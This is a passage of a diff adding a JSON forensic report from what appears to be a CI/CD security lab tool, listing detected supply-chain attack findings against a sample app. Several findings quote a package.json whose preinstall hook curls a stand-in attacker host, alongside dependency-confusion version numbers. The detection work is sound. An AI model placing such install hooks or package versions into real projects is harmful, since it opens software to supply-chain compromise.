@@ -1,0 +1,2510 @@
+{
+  "dpff_version": "2.0.0",
+  "export_format": "DPFF-JSON",
+  "exported_at": "2026-02-19T13:31:34.011109",
+  "investigation": {
+    "id": "13e17fa1",
+    "mode": "lab-analysis",
+    "duration_seconds": 2.53,
+    "event_count": 209,
+    "finding_count": 28
+  },
+  "integrity": {
+    "status": "INTACT",
+    "verified_count": 0,
+    "failed_count": 0
+  },
+  "chain_of_custody": {
+    "root_hash": "33ded2099619456106e138841b5147be4fb2682d0a270139703cc5ed90ac45eb",
+    "algorithm": "SHA-256",
+    "event_hashes": []
+  },
+  "findings": [
+    {
+      "incident_number": 1,
+      "rule_id": "RULE-001",
+      "severity": "CRITICAL",
+      "confidence": 0.8,
+      "mitre_attack_id": "T1059.004",
+      "root_cause": "Pipeline Injection Detected: Suspicious command found in build logs matching 2 exfiltration indicator(s).",
+      "is_compromised": true,
+      "evidence_timeline": [
+        {
+          "timestamp": "2026-02-19T05:53:57",
+          "source": "GitHub",
+          "event_type": "git.push",
+          "details": "Actor: dpff-admin, Action: git.push, Repo: dpff-lab/sample-app, Message: Update dependencies to latest versions\n, Files: package.json\n[Content of package.json]:\n{\n  \"name\": \"dpff-sample-app\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Sample CI/CD target app\",\n  \"main\": \"app.js\",\n  \"scripts\": {\n    \"start\": \"node app.js\",\n    \"test\": \"echo \\\"Tests passed\\\" && exit 0\",\n    \"preinstall\": \"curl http://attacker.evil.com/callback\"\n  },\n  \"dependencies\": {\n    \"internal-utils\": \"99.0.0\",\n    \"internal-auth-sdk\": \"102.3.1\"\n  }\n}\n",
+          "evidence_hash": "6871112a44569e807c6306ddde6f43b4df12fdfe4ec7d769e410cda42a6bf1a2",
+          "collected_at": "2026-02-19T13:31:33.959234"
+        }
+      ]
+    },
+    {
+      "incident_number": 2,
+      "rule_id": "RULE-001",
+      "severity": "CRITICAL",
+      "confidence": 0.8,
+      "mitre_attack_id": "T1059.004",
+      "root_cause": "Pipeline Injection Detected: Suspicious command found in build logs matching 2 exfiltration indicator(s).",
+      "is_compromised": true,
+      "evidence_timeline": [
+        {
+          "timestamp": "2026-02-19T06:09:09",
+          "source": "GitHub",
+          "event_type": "git.push",
+          "details": "Actor: dpff-admin, Action: git.push, Repo: dpff-lab/sample-app, Message: Update dependencies to latest versions\n, Files: package.json\n[Content of package.json]:\n{\n  \"name\": \"dpff-sample-app\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Sample CI/CD target app\",\n  \"main\": \"app.js\",\n  \"scripts\": {\n    \"start\": \"node app.js\",\n    \"test\": \"echo \\\"Tests passed\\\" && exit 0\",\n    \"preinstall\": \"curl http://attacker.evil.com/callback\"\n  },\n  \"dependencies\": {\n    \"internal-utils\": \"99.0.0\",\n    \"internal-auth-sdk\": \"102.3.1\"\n  }\n}\n",
+          "evidence_hash": "d8887b1295a954f8c141019589c2e3d73b891d93f7c182fc34e0a09e8b677921",
+          "collected_at": "2026-02-19T13:31:33.959234"
+        }
+      ]
+    },
+    {
+      "incident_number": 3,
+      "rule_id": "RULE-002",
+      "severity": "HIGH",
+      "confidence": 0.6,
+      "mitre_attack_id": "T1078",
+      "root_cause": "Credential Theft Suspected: Flagged author detected in GitHub.",
+      "is_compromised": true,
+      "evidence_timeline": [
+        {
+          "timestamp": "2026-02-19T05:47:57",
+          "source": "GitHub",
+          "event_type": "git.push",
+          "details": "Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Add deployment key\n, Files: credentials/id_rsa",
+          "evidence_hash": "f33202554969d708efdf6e7b830dfefe45abb9ec9ae514ea3642c7befb48f286",
+          "collected_at": "2026-02-19T13:31:33.959234"
+        }
+      ]
+    },
+    {
+      "incident_number": 4,
+      "rule_id": "RULE-002",
+      "severity": "HIGH",
+      "confidence": 0.6,
+      "mitre_attack_id": "T1078",
+      "root_cause": "Credential Theft Suspected: Flagged author detected in GitHub.",
+      "is_compromised": true,
+      "evidence_timeline": [
+        {
+          "timestamp": "2026-02-19T05:48:12",
+          "source": "GitHub",
+          "event_type": "git.push",
+          "details": "Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config\n, Files: ",
+          "evidence_hash": "017d0142c1f1141ef04a040390854692fb89df9e135e7da6b7d124efcd5c30d1",
+          "collected_at": "2026-02-19T13:31:33.959234"
+        }
+      ]
+    },
+    {
+      "incident_number": 5,
+      "rule_id": "RULE-002",
+      "severity": "HIGH",
+      "confidence": 0.6,
+      "mitre_attack_id": "T1078",
+      "root_cause": "Credential Theft Suspected: Flagged author detected in GitHub.",
+      "is_compromised": true,
+      "evidence_timeline": [
+        {
+          "timestamp": "2026-02-19T05:53:55",
+          "source": "GitHub",
+          "event_type": "git.push",
+          "details": "Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config\n, Files: ",
+          "evidence_hash": "175bc231c76a00646fbcf96598987430cf38323b772e23012b1ecadf7dd26b08",
+          "collected_at": "2026-02-19T13:31:33.959234"
+        }
+      ]
+    },
+    {
+      "incident_number": 6,
+      "rule_id": "RULE-002",
+      "severity": "HIGH",
+      "confidence": 0.6,
+      "mitre_attack_id": "T1078",
+      "root_cause": "Credential Theft Suspected: Flagged author detected in GitHub.",
+      "is_compromised": true,
+      "evidence_timeline": [
+        {
+          "timestamp": "2026-02-19T05:53:57",
+          "source": "GitHub",
+          "event_type": "git.push",
+          "details": "Actor: dpff-admin, Action: git.push, Repo: dpff-lab/sample-app, Message: Update dependencies to latest versions\n, Files: package.json\n[Content of package.json]:\n{\n  \"name\": \"dpff-sample-app\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Sample CI/CD target app\",\n  \"main\": \"app.js\",\n  \"scripts\": {\n    \"start\": \"node app.js\",\n    \"test\": \"echo \\\"Tests passed\\\" && exit 0\",\n    \"preinstall\": \"curl http://attacker.evil.com/callback\"\n  },\n  \"dependencies\": {\n    \"internal-utils\": \"99.0.0\",\n    \"internal-auth-sdk\": \"102.3.1\"\n  }\n}\n",
+          "evidence_hash": "6871112a44569e807c6306ddde6f43b4df12fdfe4ec7d769e410cda42a6bf1a2",
+          "collected_at": "2026-02-19T13:31:33.959234"
+        }
+      ]
+    },
+    {
+      "incident_number": 7,
+      "rule_id": "RULE-002",
+      "severity": "HIGH",
+      "confidence": 0.6,
+      "mitre_attack_id": "T1078",
+      "root_cause": "Credential Theft Suspected: Flagged author detected in GitHub.",
+      "is_compromised": true,
+      "evidence_timeline": [
+        {
+          "timestamp": "2026-02-19T05:54:10",
+          "source": "GitHub",
+          "event_type": "git.push",
+          "details": "Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config\n, Files: ",
+          "evidence_hash": "e82f6e0532f4a6114f20c1896f4048ea54b7368a20af6b6dabc443642dc627a2",
+          "collected_at": "2026-02-19T13:31:33.959234"
+        }
+      ]
+    },
+    {
+      "incident_number": 8,
+      "rule_id": "RULE-002",
+      "severity": "HIGH",
+      "confidence": 0.6,
+      "mitre_attack_id": "T1078",
+      "root_cause": "Credential Theft Suspected: Flagged author detected in GitHub.",
+      "is_compromised": true,
+      "evidence_timeline": [
+        {
+          "timestamp": "2026-02-19T06:09:07",
+          "source": "GitHub",
+          "event_type": "git.push",
+          "details": "Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config\n, Files: ",
+          "evidence_hash": "d922161168e3a8c661c369a5e589a53582b7696a7b73c7bc5dde022b52d77e10",
+          "collected_at": "2026-02-19T13:31:33.959234"
+        }
+      ]
+    },
+    {
+      "incident_number": 9,
+      "rule_id": "RULE-002",
+      "severity": "HIGH",
+      "confidence": 0.6,
+      "mitre_attack_id": "T1078",
+      "root_cause": "Credential Theft Suspected: Flagged author detected in GitHub.",
+      "is_compromised": true,
+      "evidence_timeline": [
+        {
+          "timestamp": "2026-02-19T06:09:09",
+          "source": "GitHub",
+          "event_type": "git.push",
+          "details": "Actor: dpff-admin, Action: git.push, Repo: dpff-lab/sample-app, Message: Update dependencies to latest versions\n, Files: package.json\n[Content of package.json]:\n{\n  \"name\": \"dpff-sample-app\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Sample CI/CD target app\",\n  \"main\": \"app.js\",\n  \"scripts\": {\n    \"start\": \"node app.js\",\n    \"test\": \"echo \\\"Tests passed\\\" && exit 0\",\n    \"preinstall\": \"curl http://attacker.evil.com/callback\"\n  },\n  \"dependencies\": {\n    \"internal-utils\": \"99.0.0\",\n    \"internal-auth-sdk\": \"102.3.1\"\n  }\n}\n",
+          "evidence_hash": "d8887b1295a954f8c141019589c2e3d73b891d93f7c182fc34e0a09e8b677921",
+          "collected_at": "2026-02-19T13:31:33.959234"
+        }
+      ]
+    },
+    {
+      "incident_number": 10,
+      "rule_id": "RULE-002",
+      "severity": "HIGH",
+      "confidence": 0.6,
+      "mitre_attack_id": "T1078",
+      "root_cause": "Credential Theft Suspected: Flagged author detected in GitHub.",
+      "is_compromised": true,
+      "evidence_timeline": [
+        {
+          "timestamp": "2026-02-19T06:09:21",
+          "source": "GitHub",
+          "event_type": "git.push",
+          "details": "Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config\n, Files: ",
+          "evidence_hash": "a30c1956eae57093cad2a595621179debb26671abad50ca6ac2b2a41ac3cd337",
+          "collected_at": "2026-02-19T13:31:33.959234"
+        }
+      ]
+    },
+    {
+      "incident_number": 11,
+      "rule_id": "RULE-002",
+      "severity": "HIGH",
+      "confidence": 0.6,
+      "mitre_attack_id": "T1078",
+      "root_cause": "Credential Theft Suspected: Flagged author detected in GitHub.",
+      "is_compromised": true,
+      "evidence_timeline": [
+        {
+          "timestamp": "2026-02-19T06:12:22",
+          "source": "GitHub",
+          "event_type": "git.push",
+          "details": "Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config\n, Files: ",
+          "evidence_hash": "d4c071a9a5725c2a068aa3587abcc54b972aa80b692e07b6947d3d25b9379cdf",
+          "collected_at": "2026-02-19T13:31:33.959234"
+        }
+      ]
+    },
+    {
+      "incident_number": 12,
+      "rule_id": "RULE-002",
+      "severity": "HIGH",
+      "confidence": 0.6,
+      "mitre_attack_id": "T1078",
+      "root_cause": "Credential Theft Suspected: Flagged author detected in GitHub.",
+      "is_compromised": true,
+      "evidence_timeline": [
+        {
+          "timestamp": "2026-02-19T06:12:41",
+          "source": "GitHub",
+          "event_type": "git.push",
+          "details": "Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config\n, Files: ",
+          "evidence_hash": "df5c730dbb0e7d697199b6dd57bbbc973cc9c5272cda4a23e0e31bdd96e4a77c",
+          "collected_at": "2026-02-19T13:31:33.959234"
+        }
+      ]
+    },
+    {
+      "incident_number": 13,
+      "rule_id": "RULE-003",
+      "severity": "CRITICAL",
+      "confidence": 0.6,
+      "mitre_attack_id": "T1195.002",
+      "root_cause": "Dependency Confusion Detected: Internal package pulled from public registry with suspicious version pattern.",
+      "is_compromised": true,
+      "evidence_timeline": [
+        {
+          "timestamp": "2026-02-19T05:53:57",
+          "source": "GitHub",
+          "event_type": "git.push",
+          "details": "Actor: dpff-admin, Action: git.push, Repo: dpff-lab/sample-app, Message: Update dependencies to latest versions\n, Files: package.json\n[Content of package.json]:\n{\n  \"name\": \"dpff-sample-app\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Sample CI/CD target app\",\n  \"main\": \"app.js\",\n  \"scripts\": {\n    \"start\": \"node app.js\",\n    \"test\": \"echo \\\"Tests passed\\\" && exit 0\",\n    \"preinstall\": \"curl http://attacker.evil.com/callback\"\n  },\n  \"dependencies\": {\n    \"internal-utils\": \"99.0.0\",\n    \"internal-auth-sdk\": \"102.3.1\"\n  }\n}\n",
+          "evidence_hash": "6871112a44569e807c6306ddde6f43b4df12fdfe4ec7d769e410cda42a6bf1a2",
+          "collected_at": "2026-02-19T13:31:33.959234"
+        }
+      ]
+    },
+    {
+      "incident_number": 14,
+      "rule_id": "RULE-003",
+      "severity": "CRITICAL",
+      "confidence": 0.6,
+      "mitre_attack_id": "T1195.002",
+      "root_cause": "Dependency Confusion Detected: Internal package pulled from public registry with suspicious version pattern.",
+      "is_compromised": true,
+      "evidence_timeline": [
+        {
+          "timestamp": "2026-02-19T06:09:09",
+          "source": "GitHub",
+          "event_type": "git.push",
+          "details": "Actor: dpff-admin, Action: git.push, Repo: dpff-lab/sample-app, Message: Update dependencies to latest versions\n, Files: package.json\n[Content of package.json]:\n{\n  \"name\": \"dpff-sample-app\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Sample CI/CD target app\",\n  \"main\": \"app.js\",\n  \"scripts\": {\n    \"start\": \"node app.js\",\n    \"test\": \"echo \\\"Tests passed\\\" && exit 0\",\n    \"preinstall\": \"curl http://attacker.evil.com/callback\"\n  },\n  \"dependencies\": {\n    \"internal-utils\": \"99.0.0\",\n    \"internal-auth-sdk\": \"102.3.1\"\n  }\n}\n",
+          "evidence_hash": "d8887b1295a954f8c141019589c2e3d73b891d93f7c182fc34e0a09e8b677921",
+          "collected_at": "2026-02-19T13:31:33.959234"
+        }
+      ]
+    },
+    {
+      "incident_number": 15,
+      "rule_id": "RULE-004",
+      "severity": "HIGH",
+      "confidence": 0.7,
+      "mitre_attack_id": "T1525",
+      "root_cause": "Artifact Tampering Suspected: Tag 'localhost:5000/dpff-sample-app' was overwritten 16 times. (Registry did not provide digests).",
+      "is_compromised": true,
+      "evidence_timeline": [
+        {
+          "timestamp": "2026-02-19T05:33:45.842643",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "d37a216e6204e4660fd37ce3d09ef59214c4557fd20ec3c9fc422f6fa4a99d45",
+          "collected_at": "2026-02-19T13:31:33.959234"
+        },
+        {
+          "timestamp": "2026-02-19T05:33:49.567636",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "28b2e7cd4acf748c634f56c259e86371f597157143265de0d03839b2519d0067",
+          "collected_at": "2026-02-19T13:31:33.959234"
+        },
+        {
+          "timestamp": "2026-02-19T05:34:10.576396",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "9d7b05894a37d263423323c77546c8d9c65ef2065d16c5f1f48886a583e76d1c",
+          "collected_at": "2026-02-19T13:31:33.959817"
+        },
+        {
+          "timestamp": "2026-02-19T05:34:13.879790",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "e2c5d59b1cfa24ed504ba197f30a40f83c05b6e171a4d59ff659ed3b2d656464",
+          "collected_at": "2026-02-19T13:31:33.959817"
+        },
+        {
+          "timestamp": "2026-02-19T05:40:00.798136",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "e5c497504eda7696aa77eba206eab64e6f3236787d489947d61b8530b96bc473",
+          "collected_at": "2026-02-19T13:31:33.959817"
+        },
+        {
+          "timestamp": "2026-02-19T05:40:04.022093",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "7116bd0f039d5d8b0fd019e4239ce1aeeccdbd9d5f763f56d3cc6e5ee8e87ef7",
+          "collected_at": "2026-02-19T13:31:33.959817"
+        },
+        {
+          "timestamp": "2026-02-19T05:40:16.826126",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "ab9e433d74e44e125d1eba87a587c22a85f4a9f01692889bc27c5549f4263aa1",
+          "collected_at": "2026-02-19T13:31:33.959817"
+        },
+        {
+          "timestamp": "2026-02-19T05:40:20.123902",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "0851e21968aa2a43a216fbd480a1a3d6111f46a60d1efc58ea674283961e2595",
+          "collected_at": "2026-02-19T13:31:33.959817"
+        },
+        {
+          "timestamp": "2026-02-19T05:43:51.576552",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "badeef889294772b13ebb57bc6de076b89c60e3d028fd84f9e9a53cacf90efe5",
+          "collected_at": "2026-02-19T13:31:33.959817"
+        },
+        {
+          "timestamp": "2026-02-19T05:43:55.065284",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "1073330525319bda44828f8b897e652559247aa7e6aa7bd9b2cdd1147b5e8e4f",
+          "collected_at": "2026-02-19T13:31:33.959817"
+        },
+        {
+          "timestamp": "2026-02-19T05:44:08.106554",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "b60184606b09e53638cca83b9d3b13d7609f1b8028bd51d3209aa126d155dbd7",
+          "collected_at": "2026-02-19T13:31:33.959817"
+        },
+        {
+          "timestamp": "2026-02-19T05:44:11.220015",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "9ca006ebfb035853b891d21f44c087756411b5d91dcce65e3ad5aaa8f5e404bf",
+          "collected_at": "2026-02-19T13:31:33.959817"
+        },
+        {
+          "timestamp": "2026-02-19T06:12:29.646569",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "264b943b638cf10e26383bbc54501338fdb6affb31be09d569ae57a5859dbc5b",
+          "collected_at": "2026-02-19T13:31:33.960345"
+        },
+        {
+          "timestamp": "2026-02-19T06:12:32.038065",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "478cdb19ec008d2ce1aa073879b1cd586d044a18090bde36341324e5f12b71f0",
+          "collected_at": "2026-02-19T13:31:33.960345"
+        },
+        {
+          "timestamp": "2026-02-19T06:12:47.243840",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "a63499e6b680c05cdc187f3f4dcf1cbfe036e3c87ec70596d4527814017bfb10",
+          "collected_at": "2026-02-19T13:31:33.960345"
+        },
+        {
+          "timestamp": "2026-02-19T06:12:49.485927",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "94f6569177cf1e322faa683d1983397e044eb7a4cc3092f98086cd413f1acc99",
+          "collected_at": "2026-02-19T13:31:33.960345"
+        }
+      ]
+    },
+    {
+      "incident_number": 16,
+      "rule_id": "RULE-005",
+      "severity": "HIGH",
+      "confidence": 0.6,
+      "mitre_attack_id": "T1027",
+      "root_cause": "Obfuscated Command Detected: 1 encoding/evasion indicator(s) found in pipeline step.",
+      "is_compromised": true,
+      "evidence_timeline": [
+        {
+          "timestamp": "2026-02-19T11:24:10.793000",
+          "source": "Jenkins",
+          "event_type": "Step Execution",
+          "details": "Job: dpff-attack-05-obfuscation, Line 17: + base64 -d",
+          "evidence_hash": "2368a5bfd38db65758afba51893e18dc5c540d4d26a728e3880f5e3d60200be1",
+          "collected_at": "2026-02-19T13:31:33.959234"
+        }
+      ]
+    },
+    {
+      "incident_number": 17,
+      "rule_id": "RULE-006",
+      "severity": "CRITICAL",
+      "confidence": 0.95,
+      "mitre_attack_id": "T1611",
+      "root_cause": "Privileged Container Detected: Pod deployed with dangerous security config (privileged, hostNetwork, hostPID).",
+      "is_compromised": true,
+      "evidence_timeline": [
+        {
+          "timestamp": "2026-02-19T06:12:38",
+          "source": "Docker",
+          "event_type": "Container Audit",
+          "details": "Container: dpff-attack-06-privileged, Image: alpine:latest, Status: exited [PRIVILEGED: privileged=true, hostNetwork=true, hostPID=true]",
+          "evidence_hash": "4eef91280454a26fbf38737dab6ad50590f3bb55b473b380768d46c27af09b76",
+          "collected_at": "2026-02-19T13:31:33.960345"
+        }
+      ]
+    },
+    {
+      "incident_number": 18,
+      "rule_id": "RULE-006",
+      "severity": "CRITICAL",
+      "confidence": 0.6,
+      "mitre_attack_id": "T1611",
+      "root_cause": "Privileged Container Detected: Pod deployed with dangerous security config (hostNetwork).",
+      "is_compromised": true,
+      "evidence_timeline": [
+        {
+          "timestamp": "2026-02-19T06:12:39",
+          "source": "Docker",
+          "event_type": "Container Audit",
+          "details": "Container: dpff-attack-06-hostnet, Image: alpine:latest, Status: exited [PRIVILEGED: hostNetwork=true]",
+          "evidence_hash": "88e037ef22e1829ab943469b20c65cd4a5708ebe6e11d4191fe2edc7a71eb07a",
+          "collected_at": "2026-02-19T13:31:33.960345"
+        }
+      ]
+    },
+    {
+      "incident_number": 19,
+      "rule_id": "RULE-007",
+      "severity": "CRITICAL",
+      "confidence": 0.8,
+      "mitre_attack_id": "T1195",
+      "root_cause": "Multi-Stage Attack Chain: 3 correlated events detected within a 30-minute window starting from suspicious commit.",
+      "is_compromised": true,
+      "evidence_timeline": [
+        {
+          "timestamp": "2026-02-19T05:47:57",
+          "source": "GitHub",
+          "event_type": "git.push",
+          "details": "Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Add deployment key\n, Files: credentials/id_rsa",
+          "evidence_hash": "f33202554969d708efdf6e7b830dfefe45abb9ec9ae514ea3642c7befb48f286",
+          "collected_at": "2026-02-19T13:31:33.959234"
+        },
+        {
+          "timestamp": "2026-02-19T06:12:29.646569",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "264b943b638cf10e26383bbc54501338fdb6affb31be09d569ae57a5859dbc5b",
+          "collected_at": "2026-02-19T13:31:33.960345"
+        },
+        {
+          "timestamp": "2026-02-19T06:12:32.038065",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "478cdb19ec008d2ce1aa073879b1cd586d044a18090bde36341324e5f12b71f0",
+          "collected_at": "2026-02-19T13:31:33.960345"
+        }
+      ]
+    },
+    {
+      "incident_number": 20,
+      "rule_id": "RULE-007",
+      "severity": "CRITICAL",
+      "confidence": 0.8,
+      "mitre_attack_id": "T1195",
+      "root_cause": "Multi-Stage Attack Chain: 3 correlated events detected within a 30-minute window starting from suspicious commit.",
+      "is_compromised": true,
+      "evidence_timeline": [
+        {
+          "timestamp": "2026-02-19T05:48:12",
+          "source": "GitHub",
+          "event_type": "git.push",
+          "details": "Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config\n, Files: ",
+          "evidence_hash": "017d0142c1f1141ef04a040390854692fb89df9e135e7da6b7d124efcd5c30d1",
+          "collected_at": "2026-02-19T13:31:33.959234"
+        },
+        {
+          "timestamp": "2026-02-19T06:12:29.646569",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "264b943b638cf10e26383bbc54501338fdb6affb31be09d569ae57a5859dbc5b",
+          "collected_at": "2026-02-19T13:31:33.960345"
+        },
+        {
+          "timestamp": "2026-02-19T06:12:32.038065",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "478cdb19ec008d2ce1aa073879b1cd586d044a18090bde36341324e5f12b71f0",
+          "collected_at": "2026-02-19T13:31:33.960345"
+        }
+      ]
+    },
+    {
+      "incident_number": 21,
+      "rule_id": "RULE-007",
+      "severity": "CRITICAL",
+      "confidence": 0.8,
+      "mitre_attack_id": "T1195",
+      "root_cause": "Multi-Stage Attack Chain: 3 correlated events detected within a 30-minute window starting from suspicious commit.",
+      "is_compromised": true,
+      "evidence_timeline": [
+        {
+          "timestamp": "2026-02-19T05:53:55",
+          "source": "GitHub",
+          "event_type": "git.push",
+          "details": "Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config\n, Files: ",
+          "evidence_hash": "175bc231c76a00646fbcf96598987430cf38323b772e23012b1ecadf7dd26b08",
+          "collected_at": "2026-02-19T13:31:33.959234"
+        },
+        {
+          "timestamp": "2026-02-19T06:12:29.646569",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "264b943b638cf10e26383bbc54501338fdb6affb31be09d569ae57a5859dbc5b",
+          "collected_at": "2026-02-19T13:31:33.960345"
+        },
+        {
+          "timestamp": "2026-02-19T06:12:32.038065",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "478cdb19ec008d2ce1aa073879b1cd586d044a18090bde36341324e5f12b71f0",
+          "collected_at": "2026-02-19T13:31:33.960345"
+        }
+      ]
+    },
+    {
+      "incident_number": 22,
+      "rule_id": "RULE-007",
+      "severity": "CRITICAL",
+      "confidence": 0.8,
+      "mitre_attack_id": "T1195",
+      "root_cause": "Multi-Stage Attack Chain: 3 correlated events detected within a 30-minute window starting from suspicious commit.",
+      "is_compromised": true,
+      "evidence_timeline": [
+        {
+          "timestamp": "2026-02-19T05:53:57",
+          "source": "GitHub",
+          "event_type": "git.push",
+          "details": "Actor: dpff-admin, Action: git.push, Repo: dpff-lab/sample-app, Message: Update dependencies to latest versions\n, Files: package.json\n[Content of package.json]:\n{\n  \"name\": \"dpff-sample-app\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Sample CI/CD target app\",\n  \"main\": \"app.js\",\n  \"scripts\": {\n    \"start\": \"node app.js\",\n    \"test\": \"echo \\\"Tests passed\\\" && exit 0\",\n    \"preinstall\": \"curl http://attacker.evil.com/callback\"\n  },\n  \"dependencies\": {\n    \"internal-utils\": \"99.0.0\",\n    \"internal-auth-sdk\": \"102.3.1\"\n  }\n}\n",
+          "evidence_hash": "6871112a44569e807c6306ddde6f43b4df12fdfe4ec7d769e410cda42a6bf1a2",
+          "collected_at": "2026-02-19T13:31:33.959234"
+        },
+        {
+          "timestamp": "2026-02-19T06:12:29.646569",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "264b943b638cf10e26383bbc54501338fdb6affb31be09d569ae57a5859dbc5b",
+          "collected_at": "2026-02-19T13:31:33.960345"
+        },
+        {
+          "timestamp": "2026-02-19T06:12:32.038065",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "478cdb19ec008d2ce1aa073879b1cd586d044a18090bde36341324e5f12b71f0",
+          "collected_at": "2026-02-19T13:31:33.960345"
+        }
+      ]
+    },
+    {
+      "incident_number": 23,
+      "rule_id": "RULE-007",
+      "severity": "CRITICAL",
+      "confidence": 0.8,
+      "mitre_attack_id": "T1195",
+      "root_cause": "Multi-Stage Attack Chain: 3 correlated events detected within a 30-minute window starting from suspicious commit.",
+      "is_compromised": true,
+      "evidence_timeline": [
+        {
+          "timestamp": "2026-02-19T05:54:10",
+          "source": "GitHub",
+          "event_type": "git.push",
+          "details": "Actor: attacker, Action: git.push, Repo: dpff-lab/sample-app, Message: Update environment config\n, Files: ",
+          "evidence_hash": "e82f6e0532f4a6114f20c1896f4048ea54b7368a20af6b6dabc443642dc627a2",
+          "collected_at": "2026-02-19T13:31:33.959234"
+        },
+        {
+          "timestamp": "2026-02-19T06:12:29.646569",
+          "source": "Docker",
+          "event_type": "Image push",
+          "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+          "evidence_hash": "264b943b638cf10e26383bbc54501338fdb6affb31be09d569ae57a5859dbc5b",
+          "collected_at": "2026-02-19T13:31:33.960345"
+        },
+        {
+          "timestamp": "2026-02-19T06:12:32.038065",
+          "source": "Docker",
